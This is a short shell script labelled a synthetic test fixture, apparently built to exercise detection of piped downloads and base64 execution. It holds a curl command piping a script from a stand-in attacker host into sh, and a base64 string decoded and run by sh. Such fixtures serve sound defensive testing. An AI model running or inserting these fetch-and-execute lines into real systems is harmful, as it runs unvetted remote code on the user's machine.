#!/bin/sh
# SYNTHETIC TEST FIXTURE — piped download + base64 exec.
curl -s https://evil.example/setup.sh | sh
echo ZWNobyAiYmFkIgo= | base64 -d | sh
